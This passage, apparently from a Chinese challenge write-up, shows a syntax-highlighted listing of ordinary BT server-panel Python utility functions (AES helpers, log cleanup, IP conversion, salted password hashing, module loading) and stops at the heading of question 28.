class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    import_cdn_plugin()</span><br><span class="line">    get = dict_obj()</span><br><span class="line">    get.cdn_url = cdn_url</span><br><span class="line">    <span class="keyword">import</span> static_cdn_main</span><br><span class="line">    static_cdn_main.static_cdn_main().set_url(get)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_python_bin</span>():</span><br><span class="line">    bin_file = <span class="string">&#x27;/www/server/panel/pyenv/bin/python&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(bin_file):</span><br><span class="line">        <span class="keyword">return</span> bin_file</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;/usr/bin/python&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">data,key</span>):</span><br><span class="line">    <span class="keyword">import</span> panelAes</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">        aes_obj = panelAes.aescrypt_py2(key)</span><br><span class="line">        <span class="keyword">return</span> aes_obj.aesencrypt(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aes_obj = panelAes.aescrypt_py3(key)</span><br><span class="line">        <span class="keyword">return</span> aes_obj.aesencrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">data,key</span>):</span><br><span class="line">    <span class="keyword">import</span> panelAes</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">        aes_obj = panelAes.aescrypt_py2(key)</span><br><span class="line">        <span class="keyword">return</span> aes_obj.aesdecrypt(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aes_obj = panelAes.aescrypt_py3(key)</span><br><span class="line">        <span class="keyword">return</span> aes_obj.aesdecrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清理大日志文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_max_log</span>(<span class="params">log_file,max_size = <span class="number">100</span>,old_line = <span class="number">100</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(log_file): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    max_size = <span class="number">1024</span> * <span class="number">1024</span> * max_size</span><br><span class="line">    <span class="keyword">if</span> os.path.getsize(log_file) &gt; max_size:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            old_body = GetNumLines(log_file,old_line)</span><br><span class="line">            writeFile(log_file,old_body)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(get_error_info())</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取证书哈希</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cert_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> panelSSL</span><br><span class="line">    get = dict_obj()</span><br><span class="line">    get.certPath = path</span><br><span class="line">    data = panelSSL.panelSSL().GetCertName(get)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取系统发行版</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_linux_distribution</span>():</span><br><span class="line">    distribution = <span class="string">&#x27;ubuntu&#x27;</span></span><br><span class="line">    redhat_file = <span class="string">&#x27;/etc/redhat-release&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(redhat_file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp = readFile(redhat_file).split()[<span class="number">3</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(tmp) &gt; <span class="number">7</span>:</span><br><span class="line">                distribution = <span class="string">&#x27;centos8&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            distribution = <span class="string">&#x27;centos7&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> distribution</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long2ip</span>(<span class="params">ips</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 将整数转换为IP地址</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-06-11&gt;</span></span><br><span class="line"><span class="string">        @param ips string(ip地址整数)</span></span><br><span class="line"><span class="string">        @return ipv4</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    i1 = <span class="built_in">int</span>(ips / (<span class="number">2</span> ** <span class="number">24</span>))</span><br><span class="line">    i2 = <span class="built_in">int</span>((ips - i1 * ( <span class="number">2</span> ** <span class="number">24</span> )) / ( <span class="number">2</span> ** <span class="number">16</span> ))</span><br><span class="line">    i3 = <span class="built_in">int</span>(((ips - i1 * ( <span class="number">2</span> ** <span class="number">24</span> )) - i2 * ( <span class="number">2</span> ** <span class="number">16</span> )) / ( <span class="number">2</span> ** <span class="number">8</span>))</span><br><span class="line">    i4 = <span class="built_in">int</span>(((ips - i1 * ( <span class="number">2</span> ** <span class="number">24</span> )) - i2 * ( <span class="number">2</span> ** <span class="number">16</span> )) - i3 * ( <span class="number">2</span> ** <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i1,i2,i3,i4)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip2long</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 将IP地址转换为整数</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-06-11&gt;</span></span><br><span class="line"><span class="string">        @param ip string(ipv4)</span></span><br><span class="line"><span class="string">        @return long</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    ips = ip.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ips) != <span class="number">4</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    iplong = <span class="number">2</span> ** <span class="number">24</span> * <span class="built_in">int</span>(ips[<span class="number">0</span>]) + <span class="number">2</span> ** <span class="number">16</span> * <span class="built_in">int</span>(ips[<span class="number">1</span>])  + <span class="number">2</span> ** <span class="number">8</span> * <span class="built_in">int</span>(ips[<span class="number">2</span>])  + <span class="built_in">int</span>(ips[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> iplong</span><br><span class="line"></span><br><span class="line"><span class="comment">#提交关键词</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_keyword</span>(<span class="params">keyword</span>):</span><br><span class="line">    pdata = &#123;<span class="string">&quot;keyword&quot;</span>:keyword&#125;</span><br><span class="line">    httpPost(GetConfigValue(<span class="string">&#x27;home&#x27;</span>) + <span class="string">&#x27;/api/panel/total_keyword&#x27;</span>,pdata)</span><br><span class="line"></span><br><span class="line"><span class="comment">#统计关键词</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">total_keyword</span>(<span class="params">keyword</span>):</span><br><span class="line">    <span class="keyword">import</span> threading</span><br><span class="line">    p = threading.Thread(target=submit_keyword,args=(keyword,))</span><br><span class="line">    p.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    p.start()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取debug日志</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_debug_log</span>():</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> request</span><br><span class="line">    <span class="keyword">return</span> GetClientIp() +<span class="string">&#x27;:&#x27;</span>+ <span class="built_in">str</span>(request.environ.get(<span class="string">&#x27;REMOTE_PORT&#x27;</span>)) + <span class="string">&#x27;|&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time())) + <span class="string">&#x27;|&#x27;</span> + get_error_info()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取sessionid</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_session_id</span>():</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> request</span><br><span class="line">    session_id =  request.cookies.get(<span class="string">&#x27;SESSIONID&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"><span class="comment">#尝试自动恢复面板数据库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rep_default_db</span>():</span><br><span class="line">    db_path = <span class="string">&#x27;/www/server/panel/data/&#x27;</span></span><br><span class="line">    db_file = db_path + <span class="string">&#x27;default.db&#x27;</span></span><br><span class="line">    db_tmp_backup = db_path + <span class="string">&#x27;default_&#x27;</span> + format_date(<span class="string">&quot;%Y%m%d_%H%M%S&quot;</span>) + <span class="string">&quot;.db&quot;</span></span><br><span class="line"></span><br><span class="line">    panel_backup = <span class="string">&#x27;/www/backup/panel&#x27;</span></span><br><span class="line">    bak_list = os.listdir(panel_backup)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bak_list: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    bak_list = <span class="built_in">sorted</span>(bak_list,reverse=<span class="literal">True</span>)</span><br><span class="line">    db_bak_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d_name <span class="keyword">in</span> bak_list:</span><br><span class="line">        db_bak_file = panel_backup + <span class="string">&#x27;/&#x27;</span> + d_name + <span class="string">&#x27;/data/default.db&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(db_bak_file): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> os.path.getsize(db_bak_file) &lt; <span class="number">17408</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> db_bak_file: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ExecShell(<span class="string">&quot;\cp -arf &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(db_file,db_tmp_backup))</span><br><span class="line">    ExecShell(<span class="string">&quot;\cp -arf &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(db_bak_file,db_file))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chdck_salt</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 检查所有用户密码是否加盐，若没有则自动加上</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-07-08&gt;</span></span><br><span class="line"><span class="string">        @return void</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> M(<span class="string">&#x27;sqlite_master&#x27;</span>).where(<span class="string">&#x27;type=? AND name=? AND sql LIKE ?&#x27;</span>, (<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,<span class="string">&#x27;%salt%&#x27;</span>)).count():</span><br><span class="line">        M(<span class="string">&#x27;users&#x27;</span>).execute(<span class="string">&quot;ALTER TABLE &#x27;users&#x27; ADD &#x27;salt&#x27; TEXT&quot;</span>,())</span><br><span class="line">    u_list = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;salt is NULL&#x27;</span>,()).field(<span class="string">&#x27;id,username,password,salt&#x27;</span>).select()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(u_list,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> u_list.find(<span class="string">&#x27;no such table: users&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            rep_default_db()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> M(<span class="string">&#x27;sqlite_master&#x27;</span>).where(<span class="string">&#x27;type=? AND name=? AND sql LIKE ?&#x27;</span>, (<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,<span class="string">&#x27;%salt%&#x27;</span>)).count():</span><br><span class="line">                M(<span class="string">&#x27;users&#x27;</span>).execute(<span class="string">&quot;ALTER TABLE &#x27;users&#x27; ADD &#x27;salt&#x27; TEXT&quot;</span>,())</span><br><span class="line">            u_list = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;salt is NULL&#x27;</span>,()).field(<span class="string">&#x27;id,username,password,salt&#x27;</span>).select()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u_info <span class="keyword">in</span> u_list:</span><br><span class="line">        salt = GetRandomString(<span class="number">12</span>) <span class="comment">#12位随机</span></span><br><span class="line">        pdata = &#123;&#125;</span><br><span class="line">        pdata[<span class="string">&#x27;password&#x27;</span>] = md5(md5(u_info[<span class="string">&#x27;password&#x27;</span>]+<span class="string">&#x27;_bt.cn&#x27;</span>) + salt)</span><br><span class="line">        pdata[<span class="string">&#x27;salt&#x27;</span>] = salt</span><br><span class="line">        M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(u_info[<span class="string">&#x27;id&#x27;</span>],)).update(pdata)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_login_token</span>():</span><br><span class="line">    token_s = readFile(<span class="string">&#x27;/www/server/panel/data/login_token.pl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token_s: <span class="keyword">return</span> GetRandomString(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> token_s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sess_key</span>():</span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session</span><br><span class="line">    <span class="keyword">return</span> md5(get_login_token() + session.get(<span class="string">&#x27;request_token_head&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password_salt</span>(<span class="params">password,username=<span class="literal">None</span>,uid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 为指定密码加盐</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-07-08&gt;</span></span><br><span class="line"><span class="string">        @param password string(被md5加密一次的密码)</span></span><br><span class="line"><span class="string">        @param username string(用户名) 可选</span></span><br><span class="line"><span class="string">        @param uid int(uid) 可选</span></span><br><span class="line"><span class="string">        @return string</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    chdck_salt()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uid:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;username或uid必需传一项&#x27;</span>)</span><br><span class="line">        uid = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;username=?&#x27;</span>,(username,)).getField(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    salt = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(uid,)).getField(<span class="string">&#x27;salt&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> md5(md5(password+<span class="string">&#x27;_bt.cn&#x27;</span>)+salt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">package_path_append</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path <span class="keyword">in</span> sys.path:</span><br><span class="line">        sys.path.insert(<span class="number">0</span>,path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rep_sys_path</span>():</span><br><span class="line">    sys_path = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> sys.path:</span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> sys_path: <span class="keyword">continue</span></span><br><span class="line">        sys_path.append(p)</span><br><span class="line">    sys.path = sys_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ssh_port</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 获取本机SSH端口</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-08-07&gt;</span></span><br><span class="line"><span class="string">        @return int</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    s_file = <span class="string">&#x27;/etc/ssh/sshd_config&#x27;</span></span><br><span class="line">    conf = readFile(s_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> conf: conf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    rep = <span class="string">r&quot;#*Port\s+([0-9]+)\s*\n&quot;</span></span><br><span class="line">    tmp1 = re.search(rep,conf)</span><br><span class="line">    ssh_port = <span class="number">22</span></span><br><span class="line">    <span class="keyword">if</span> tmp1:</span><br><span class="line">        ssh_port = <span class="built_in">int</span>(tmp1.groups(<span class="number">0</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> ssh_port</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_error_num</span>(<span class="params">key,empty = <span class="literal">False</span>,expire=<span class="number">3600</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 设置失败次数(每调用一次+1)</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-08-21&gt;</span></span><br><span class="line"><span class="string">        @param key&lt;string&gt; 索引</span></span><br><span class="line"><span class="string">        @param empty&lt;bool&gt; 是否清空计数</span></span><br><span class="line"><span class="string">        @param expire&lt;int&gt; 计数器生命周期(秒)</span></span><br><span class="line"><span class="string">        @return bool</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    key = md5(key)</span><br><span class="line">    num = cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> num:</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> empty:</span><br><span class="line">            cache.delete(key)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    cache.<span class="built_in">set</span>(key,num + <span class="number">1</span>,expire)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_error_num</span>(<span class="params">key,limit=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 获取失败次数</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-08-21&gt;</span></span><br><span class="line"><span class="string">        @param key&lt;string&gt; 索引</span></span><br><span class="line"><span class="string">        @param limit&lt;False or int&gt; 如果为False，则直接返回失败次数，否则与失败次数比较，若大于失败次数返回True，否则返回False</span></span><br><span class="line"><span class="string">        @return int or bool</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">    key = md5(key)</span><br><span class="line">    num = cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> num: num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> limit:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">if</span> limit &gt; num:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_menus</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 获取菜单列表</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-08-31&gt;</span></span><br><span class="line"><span class="string">        @return list</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    data = json.loads(ReadFile(<span class="string">&#x27;config/menu.json&#x27;</span>))</span><br><span class="line">    hide_menu = ReadFile(<span class="string">&#x27;config/hide_menu.json&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> hide_menu:</span><br><span class="line">        hide_menu = json.loads(hide_menu)</span><br><span class="line">        show_menu = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> data[i][<span class="string">&#x27;id&#x27;</span>] <span class="keyword">in</span> hide_menu: <span class="keyword">continue</span></span><br><span class="line">            show_menu.append(data[i])</span><br><span class="line">        data = show_menu</span><br><span class="line">        <span class="keyword">del</span>(hide_menu)</span><br><span class="line">        <span class="keyword">del</span>(show_menu)</span><br><span class="line">    menus = <span class="built_in">sorted</span>(data, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;sort&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> menus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#取CURL路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_curl_bin</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 取CURL执行路径</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-09-01&gt;</span></span><br><span class="line"><span class="string">        @return string</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    c_bin = [<span class="string">&#x27;/usr/local/curl2/bin/curl&#x27;</span>,<span class="string">&#x27;/usr/local/curl/bin/curl&#x27;</span>,<span class="string">&#x27;/usr/bin/curl&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> cb <span class="keyword">in</span> c_bin:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(cb): <span class="keyword">return</span> cb</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;curl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#取通用对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dict_obj</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self,key,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, value</span>): <span class="built_in">setattr</span>(self,key,value)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>): <span class="keyword">return</span> <span class="built_in">getattr</span>(self,key,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self,key</span>): <span class="built_in">delattr</span>(self,key)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delattr__</span>(<span class="params">self, key</span>): <span class="built_in">delattr</span>(self,key)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_items</span>(<span class="params">self</span>): <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#实例化定目录下的所有模块</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">get_modules</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.get_attr(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, value</span>):</span><br><span class="line">        <span class="built_in">setattr</span>(self,key,value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_attr</span>(<span class="params">self,key</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            尝试获取模块，若为字符串，则尝试实例化模块，否则直接返回模块对像</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        res = <span class="built_in">getattr</span>(self,key)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(res,<span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_obj = <span class="built_in">__import__</span>(key)</span><br><span class="line">                reload(tmp_obj)</span><br><span class="line">                <span class="built_in">setattr</span>(self,key,tmp_obj)</span><br><span class="line">                <span class="keyword">return</span> tmp_obj</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(get_error_info())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.get_attr(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self,key</span>):</span><br><span class="line">        <span class="built_in">delattr</span>(self,key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delattr__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="built_in">delattr</span>(self,key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_items</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,path = <span class="string">&quot;class&quot;</span>,limit = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            @name 加载指定目录下的模块</span></span><br><span class="line"><span class="string">            @author hwliang&lt;2020-08-03&gt;</span></span><br><span class="line"><span class="string">            @param path&lt;string&gt; 指定目录，可指定绝对目录，也可指定相对于/www/server/panel的相对目录 默认加载class目录</span></span><br><span class="line"><span class="string">            @param limit&lt;string/list/tuple&gt; 指定限定加载的模块名称，默认加载path目录下的所有模块</span></span><br><span class="line"><span class="string">            @param object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            @example</span></span><br><span class="line"><span class="string">                p = get_modules(&#x27;class&#x27;)</span></span><br><span class="line"><span class="string">                if &#x27;public&#x27; in p:</span></span><br><span class="line"><span class="string">                    md5_str = p.public.md5(&#x27;test&#x27;)</span></span><br><span class="line"><span class="string">                    md5_str = p[&#x27;public&#x27;].md5(&#x27;test&#x27;)</span></span><br><span class="line"><span class="string">                    md5_str = getattr(p[&#x27;public&#x27;],&#x27;md5&#x27;)(&#x27;test&#x27;)</span></span><br><span class="line"><span class="string">                else:</span></span><br><span class="line"><span class="string">                    print(p.__dict__)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        os.chdir(<span class="string">&#x27;/www/server/panel&#x27;</span>)</span><br><span class="line">        exp_files = [<span class="string">&#x27;__init__.py&#x27;</span>,<span class="string">&#x27;__pycache__&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> path <span class="keyword">in</span> sys.path:</span><br><span class="line">            sys.path.insert(<span class="number">0</span>,path)</span><br><span class="line">        <span class="keyword">for</span> fname <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">            <span class="keyword">if</span> fname <span class="keyword">in</span> exp_files: <span class="keyword">continue</span></span><br><span class="line">            filename = <span class="string">&#x27;/&#x27;</span>.join([path,fname])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(filename):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> fname[-<span class="number">3</span>:] <span class="keyword">in</span> [<span class="string">&#x27;.py&#x27;</span>,<span class="string">&#x27;.so&#x27;</span>]: <span class="keyword">continue</span></span><br><span class="line">                mod_name = fname[:-<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c_file = <span class="string">&#x27;/&#x27;</span>.join((filename,<span class="string">&#x27;__init__.py&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(c_file):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                mod_name = fname</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> limit:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(limit,<span class="built_in">list</span>) <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(limit,<span class="built_in">tuple</span>):</span><br><span class="line">                    limit = (limit,)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> mod_name <span class="keyword">in</span> limit:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">setattr</span>(self,mod_name,mod_name)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="题目28"><a class="markdownIt-Anchor" href="#题目28"></a> 题目28</h3>
<ul>
<li>
